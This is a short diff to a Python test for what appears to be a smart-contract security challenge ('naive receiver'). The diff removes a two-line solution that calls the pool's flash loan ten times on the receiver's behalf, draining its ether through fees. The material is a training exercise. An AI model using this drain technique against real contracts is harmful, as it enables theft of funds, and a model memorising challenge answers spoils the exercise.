@@ -20,8 +20,6 @@ def test_naive_receiver():
     assert receiver.balance() == ETHER_IN_RECEIVER
 
     # YOUR EXPLOIT GOES HERE
-    for i in range(10):
-        pool.flashLoan(receiver.address, 0)
 
     # SUCCESS CONDITIONS
     assert receiver.balance() == 0
